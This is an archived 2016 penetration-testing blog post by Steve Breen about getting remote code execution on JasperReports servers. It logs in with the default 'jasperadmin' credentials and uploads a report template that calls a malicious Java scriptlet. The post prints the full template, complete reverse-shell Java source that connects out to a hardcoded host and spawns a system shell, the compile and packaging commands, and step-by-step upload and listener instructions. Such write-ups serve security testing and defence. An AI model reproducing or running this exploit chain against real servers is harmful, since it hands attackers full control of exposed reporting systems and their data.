---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-10-14_hacking-jasperreports-the-hidden-shell-feature.md
original_filename: 2016-10-14_hacking-jasperreports-the-hidden-shell-feature.md
title: Hacking JasperReports – The Hidden Shell Feature
category: documents
detected_topics:
- supply-chain
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- supply-chain
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 6e5f183672eb8b7c6a3c7233d50f0c54094fd69b53f5ae9f865d852dbb163dca
text_sha256: a6c1fed7bc2a1604ec9ccf26beb150e3bb674fbd03bf8c961ff00a5b0e479e37
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking JasperReports – The Hidden Shell Feature

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-10-14_hacking-jasperreports-the-hidden-shell-feature.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `6e5f183672eb8b7c6a3c7233d50f0c54094fd69b53f5ae9f865d852dbb163dca`
- Text SHA256: `a6c1fed7bc2a1604ec9ccf26beb150e3bb674fbd03bf8c961ff00a5b0e479e37`


## Content

---
title: "Hacking JasperReports – The Hidden Shell Feature"
url: "https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/"
final_url: "https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/"
authors: ["Steve Breen (@breenmachine)"]
bugs: ["RCE"]
publication_date: "2016-10-14"
added_date: "2022-11-25"
source: "pentester.land/writeups.json"
original_index: 6248
---

Posted on [October 14, 2016October 14, 2016](https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/)

# Hacking JasperReports – The Hidden Shell Feature

By @breenmachine

A short while ago, my coworkers and I were working on a penetration test for a client with a fairly small Internet facing attack surface. One thing we did find was that they had left a couple of [JasperReports](https://www.jaspersoft.com/reporting-software) servers Internet facing. It didn’t take too much work to find the default administrative account username:

![login](https://foxglovesecurity.com/wp-content/uploads/2016/10/login.png?w=960)

The password of “jasperadmin” also didn’t take too long to figure out :).

I had heard of JasperReports before but had never run into it on a penetration test. A quick bit of Googling didn’t yield any previous work. It’s pretty rare that an administrative interface doesn’t eventually give up code execution in one way or another, and so we start our journey to adding JasperReports to the penetration tester’s “easywins” list…

## Reports and “Scriptlets”

The purpose of JasperReports is to pull in data from various sources (databases, xml, flat files, etc…), aggregate it in some way, and spit out a pretty report based on some sort of user-defined template. Templates in JasperReports are defined in “JRXML” files that can be uploaded by any user allowed to create or edit reports.

In the interest of flexibility, the designers of JasperReports allow for custom manipulation of data before it is included in the report. This is accomplished through “Scriptlets” which are just Java programs! I think you can probably see where this is going.

Our goal here is to create a report template (JRXML file) that references a custom, malicious Scriptlet, which when run will send us a shell. The rest of this post will describe how we tied this together.

## ~~Creating~~ Editing the Template

Instead of creating a new report template, we’ll just edit an existing one. The following is the template we’ll be using. Note that it is overly complicated and 90% of it is totally unnecessary. This is simply one of the “sample” reports that came with “JasperStudio”. The interesting part is contained in lines 35-42 where I inserted references to “ShellScriptlet”.

shell.jrxml
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 -->
  <!-- 2016-10-04T14:01:12 -->
  <jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311">
  <property name="net.sf.jasperreports.export.pdf.tag.language" value="EN-US"/>
  <style name="Sans_Normal" isDefault="true" fontName="DejaVu Sans" fontSize="12"/>
  <style name="Sans_Bold" fontName="DejaVu Sans" fontSize="12" isBold="true"/>
  <style name="Sans_Italic" fontName="DejaVu Sans" fontSize="12" isItalic="true"/>
  <style name="PageHeader" style="Sans_Bold" forecolor="#FFFFFF" backcolor="#333333"/>
  <style name="detail" fontName="DejaVu Sans" fontSize="12">
  <conditionalStyle>
  <conditionExpression><![CDATA[new Boolean($V{CityGroup_COUNT}.intValue() % 2 == 0)]]></conditionExpression>
  <style mode="Opaque" backcolor="#E0E0E0"/>
  </conditionalStyle>
  </style>
  <subDataset name="Table Dataset 1" uuid="4fcc1d09-9859-48ee-bb6f-8d369bd49113">
  <queryString>
  <![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]>
  </queryString>
  <field name="name" class="java.lang.String"/>
  <field name="phone_office" class="java.lang.String"/>
  <field name="billing_address_city" class="java.lang.String"/>
  <field name="billing_address_street" class="java.lang.String"/>
  <field name="billing_address_country" class="java.lang.String"/>
  <sortField name="billing_address_country"/>
  <sortField name="billing_address_city"/>
  <variable name="CityyNumber" class="java.lang.Integer" incrementType="Group" incrementGroup="CityGroup" calculation="Count">
  <variableExpression><![CDATA[Boolean.TRUE]]></variableExpression>
  <initialValueExpression><![CDATA[new Integer(0)]]></initialValueExpression>
  </variable>
  <group name="CityGroup">
  <groupExpression><![CDATA[$F{billing_address_city}]]></groupExpression>
  </group>
  </subDataset>
  <scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet">
  <scriptletDescription><![CDATA[]]></scriptletDescription>
  </scriptlet>
  <title>
  <band height="79" splitType="Stretch">
  <textField>
  <reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/>
  <textFieldExpression><![CDATA[$P{ShellScriptlet_SCRIPTLET}.getShell()]]></textFieldExpression>
  </textField>
  </band>
  </title>
  <pageFooter>
  <band height="40">
  <line>
  <reportElement x="0" y="10" width="515" height="1" uuid="19826638-0487-4bb5-9b15-7e7af63b8dce">
  <property name="net.sf.jasperreports.export.pdf.tag.table" value="end"/>
  </reportElement>
  </line>
  <textField isStretchWithOverflow="true">
  <reportElement x="200" y="20" width="80" height="16" uuid="6f072af1-756c-49f4-82f3-af59e8124296"/>
  <textElement textAlignment="Right"/>
  <textFieldExpression><![CDATA["Page " + String.valueOf($V{PAGE_NUMBER}) + " of"]]></textFieldExpression>
  </textField>
  <textField isStretchWithOverflow="true" evaluationTime="Report">
  <reportElement x="280" y="20" width="75" height="16" uuid="02b15e9e-d360-4b82-a140-54b9bd3b0e81"/>
  <textElement textAlignment="Left"/>
  <textFieldExpression><![CDATA[" " + String.valueOf($V{PAGE_NUMBER})]]></textFieldExpression>
  </textField>
  </band>
  </pageFooter>
  <summary>
  <band height="149" splitType="Stretch">
  <image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon">
  <reportElement positionType="Float" x="0" y="71" width="250" height="70" uuid="aa8a8976-039f-45ac-84f3-d8d55b442410"/>
  <imageExpression><![CDATA["repo:LogoLink"]]></imageExpression>
  <hyperlinkTooltipExpression><![CDATA["JasperReports Logo"]]></hyperlinkTooltipExpression>
  </image>
  <image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon">
  <reportElement positionType="Float" x="265" y="71" width="250" height="70" uuid="4b5dd0d1-9011-42cf-ab07-f80c02d3d166"/>
  <imageExpression><![CDATA["repo:AllAccounts_Res2"]]></imageExpression>
  <hyperlinkTooltipExpression><![CDATA["Jaspersoft Logo"]]></hyperlinkTooltipExpression>
  </image>
  <componentElement>
  <reportElement key="table" x="0" y="0" width="515" height="70" uuid="db3dd84a-3743-43b3-ab7e-c4aebdb907df"/>
  <jr:table xmlns:jr="http://jasperreports.sourceforge.net/jasperreports/components" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd" whenNoDataType="AllSectionsNoDetail">
  <datasetRun subDataset="Table Dataset 1" uuid="3b2a079f-f600-46a6-a7af-720c4e939e7e">
  <connectionExpression><![CDATA[$P{REPORT_CONNECTION}]]></connectionExpression>
  </datasetRun>
  <jr:columnGroup width="515" uuid="1e5d630a-c8f9-4dbb-8415-393f7624ca35">
  <jr:groupHeader groupName="CityGroup">
  <jr:cell height="30" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="Sans_Bold" positionType="Float" mode="Opaque" x="0" y="14" width="515" height="16" isPrintWhenDetailOverflows="true" backcolor="#C0C0C0" uuid="aeafecc2-ef7e-435c-ae07-1f45ed6b179a"/>
  <box leftPadding="0" bottomPadding="0" rightPadding="0">
  <bottomPen lineWidth="1.0" lineStyle="Solid"/>
  </box>
  <textElement textAlignment="Left"/>
  <textFieldExpression><![CDATA[" " + String.valueOf($V{CityyNumber}.intValue() + 1) + ". " + $F{billing_address_city}+ ", " + $F{billing_address_country}]]></textFieldExpression>
  <anchorNameExpression><![CDATA[String.valueOf($F{billing_address_city})]]></anchorNameExpression>
  </textField>
  </jr:cell>
  </jr:groupHeader>
  <jr:column width="30" uuid="43ffff20-e89f-4f73-ad8d-878e9581274a">
  <jr:columnHeader height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="30" height="16" isPrintWhenDetailOverflows="true" uuid="a76dcb9c-8601-48bc-b9cc-3d1c316e537d">
  <property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/>
  <property name="net.sf.jasperreports.export.pdf.tag.colspan" value="1"/>
  </reportElement>
  <textFieldExpression><![CDATA[" "]]></textFieldExpression>
  </textField>
  </jr:columnHeader>
  <jr:detailCell height="20" rowSpan="1">
  <textField>
  <reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="30" height="20" isPrintWhenDetailOverflows="true" uuid="73a40f28-2c08-4849-a2a9-b83ade7a6b7d">
  <property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/>
  </reportElement>
  <box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="10">
  <bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/>
  </box>
  <textElement textAlignment="Right"/>
  <textFieldExpression><![CDATA[$V{CityGroup_COUNT}+"."]]></textFieldExpression>
  </textField>
  </jr:detailCell>
  </jr:column>
  <jr:column width="240" uuid="d472eeed-282a-402b-9044-a397ca270655">
  <jr:columnHeader height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="240" height="16" isPrintWhenDetailOverflows="true" uuid="bd0d4582-5684-4e15-8623-b3f1940bf1bb">
  <property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/>
  <property name="net.sf.jasperreports.export.pdf.tag.colspan" value="2"/>
  </reportElement>
  <box leftPadding="0" bottomPadding="0" rightPadding="0"/>
  <textFieldExpression><![CDATA["Name"]]></textFieldExpression>
  </textField>
  </jr:columnHeader>
  <jr:detailCell style="detail" height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="240" height="20" isPrintWhenDetailOverflows="true" uuid="23562605-5611-41d8-8a40-98ad9d28834a">
  <property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/>
  </reportElement>
  <box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5">
  <bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/>
  </box>
  <textFieldExpression><![CDATA[$F{name}]]></textFieldExpression>
  </textField>
  </jr:detailCell>
  </jr:column>
  <jr:column width="100" uuid="4612e5a3-cb0d-4533-9b54-9ad9828acbed">
  <jr:columnHeader height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="100" height="16" isPrintWhenDetailOverflows="true" uuid="d81f1db2-9f2e-4665-aa47-3d1a49cc9d15">
  <property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/>
  </reportElement>
  <box leftPadding="10" bottomPadding="0" rightPadding="0"/>
  <textFieldExpression><![CDATA["Phone"]]></textFieldExpression>
  </textField>
  </jr:columnHeader>
  <jr:detailCell height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="100" height="20" isPrintWhenDetailOverflows="true" uuid="e48d7dee-a092-45ea-8bd8-8440f76a9fd0">
  <property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/>
  </reportElement>
  <box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5">
  <bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/>
  </box>
  <textFieldExpression><![CDATA[$F{phone_office}]]></textFieldExpression>
  </textField>
  </jr:detailCell>
  </jr:column>
  <jr:column width="145" uuid="f0397b7d-4130-4b13-88b1-d89415b269bd">
  <jr:columnHeader height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="145" height="16" isPrintWhenDetailOverflows="true" uuid="0a1206b8-d0d6-4809-a424-3d7f09606b44">
  <property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/>
  </reportElement>
  <box leftPadding="0" bottomPadding="0" rightPadding="0"/>
  <textFieldExpression><![CDATA["Address"]]></textFieldExpression>
  </textField>
  </jr:columnHeader>
  <jr:detailCell height="20" rowSpan="1">
  <textField isStretchWithOverflow="true">
  <reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="145" height="20" isPrintWhenDetailOverflows="true" uuid="7bc63c7e-0224-441b-96ec-8a1bb67a0b84">
  <property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/>
  </reportElement>
  <box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="0">
  <bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/>
  </box>
  <textFieldExpression><![CDATA[$F{billing_address_street}]]></textFieldExpression>
  </textField>
  </jr:detailCell>
  </jr:column>
  </jr:columnGroup>
  </jr:table>
  </componentElement>
  </band>
  </summary>
  </jasperReport>
  
  

Take a close look at line 42:
  
  
  <textFieldExpression><![CDATA[$P{ShellScriptlet_SCRIPTLET}.getShell()]]></textFieldExpression>
  

Here we’re calling a method “getShell” on ShellScriptlet_SCRIPTLET. On line 35, we defined ShellScriptlet_SCRIPTLET as a reference to the Java code in “foxglove.shell.ShellScriptlet”
  
  
  <scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet">
  <scriptletDescription><![CDATA[]]></scriptletDescription>
  </scriptlet>
  

Simple enough – but where/how is the Java code itself defined?

## Writing the Scriptlet

Scriptlets are written in Java and need to extend “JRDefaultScriptlet”. I borrowed the Java code for the reverse shell from [here](https://github.com/quantumvm/JavaReverseTCPShell) and hacked it to be cross-platform, then stitched it into the scriptlet. The following is the final result, note that “host” and “port” are hardcoded:
  
  
  package foxglove.shell;
  import java.io.*;
  import java.net.*;
  import java.io.InputStream;
  import java.io.OutputStream;
  import java.io.DataInputStream;
  import net.sf.jasperreports.engine.JRDefaultScriptlet;
  import net.sf.jasperreports.engine.JRScriptletException;
  
  public class ShellScriptlet extends JRDefaultScriptlet implements Runnable{
  Socket socket;
  
  PrintWriter socketWrite;
  BufferedReader socketRead;
  
  PrintWriter commandWrite;
  BufferedReader commandRead;
  
  static String ip;
  int port = 8080;
  
  public String getShell(){
  ip = "1.1.1.1";
  ShellScriptlet shell = new ShellScriptlet();
  shell.establishConnection();
  new Thread(shell).start();
  shell.getCommand();
  return "DONE";
  }
  
  public void run(){
  spawnShell();
  }
  
  public void spawnShell(){
  boolean windows = false;
  try{
  if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
  windows = true;
  }
  
  Runtime rt = Runtime.getRuntime();
  Process p;
  if(windows) p = rt.exec("C:\\Windows\\System32\\cmd.exe");
  else p = rt.exec("/bin/sh");
  
  InputStream readme = p.getInputStream();
  OutputStream writeme = p.getOutputStream();
  commandWrite = new PrintWriter(writeme);
  commandRead = new BufferedReader(new InputStreamReader(readme));
  
  if(windows) commandWrite.println("dir");
  else commandWrite.println("ls -al");
  
  commandWrite.flush();
  
  String line;
  while((line = commandRead.readLine()) != null){
  socketWrite.println(line);
  socketWrite.flush();
  }
  
  p.destroy();
  
  }catch(Exception e){}
  
  }
  
  public void establishConnection(){
  try{
  socket = new Socket(ip,port);
  socketWrite = new PrintWriter(socket.getOutputStream(),true);
  socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));
  socketWrite.println("---Connection has been established---");
  socketWrite.flush();
  }catch(Exception e){}
  
  }
  
  public void getCommand(){
  String foo;
  
  try{
  while((foo=socketRead.readLine())!= null){
  commandWrite.println(foo);
  commandWrite.flush();
  }
  }catch(Exception e){}
  }
  
  public static void main(String args[]){
  ShellScriptlet r = new ShellScriptlet();
  r.getShell();
  }
  }
  
  

For those unfamiliar with Java, you can compile with the following command in the same directory as the source file
  
  
  /usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .
  

There is a reason that the full path to “javac” was specified here (and that it was Java 1.6). If you’re running this against an unknown system, you ideally want to have compiled it with the same version of Java that system is running, or at least not a newer version!

Next, we have to package the compiled code into a jar file to be uploaded to the target. This can be accomplished by running:
  
  
  /usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/
  

If all went well, you should now have a file “shell.jar” ready to be uploaded to the target!

## Deploying The New “Report”

Every version of JasperReports seems to look a little different, but they all have this same functionality and workflow.

First obviously we have to authenticate with “jasperadmin/jasperadmin”:

![authd.png](https://foxglovesecurity.com/wp-content/uploads/2016/10/authd.png?w=960)

In my version, this immediately displays the “Repository” with a bunch of sample reports (make sure the “Type” column says “Report”).

Next we want to right click on a report and click “Edit”.

Once there, click “Controls and Resources” and then “Add Resource”. Upload the JAR file we created earlier and give the resource the name “ShellScriptlet”. Should look something like this when finished:

![resource.png](https://foxglovesecurity.com/wp-content/uploads/2016/10/resource.png?w=960)

Go back to “Set Up” on the left. Click “Upload a Local file” and upload the JRXML file we created earlier. You should get something like this:![resources2](https://foxglovesecurity.com/wp-content/uploads/2016/10/resources2.png?w=960)

Jasper is now asking us to define some other resources that were referenced in the JRXML. If you’re a keener you could probably just remove these references from the JRXML file. Let’s just click “Add Now” and upload some random PNG files for each one… When you’re done it should look like this:

![resourcesadded](https://foxglovesecurity.com/wp-content/uploads/2016/10/resourcesadded.png?w=960)

Now you can click “Submit” at the bottom to create our malicious report :D.

## Shellz!

Before you get too excited and run that report, make sure you spin up a listener to catch your shell!

![listener.png](https://foxglovesecurity.com/wp-content/uploads/2016/10/listener.png?w=960)

Click on the report you just created, it will run the Java code, and if all goes well you should see the shell connect back.

![shell](https://foxglovesecurity.com/wp-content/uploads/2016/10/shell1.png?w=960)

### Share this:

  * [ Share on X (Opens in new window) X ](https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://foxglovesecurity.com/2016/10/14/hacking-jasperreports-the-hidden-shell-feature/?share=facebook)
  * 

Like Loading...

### _Related_
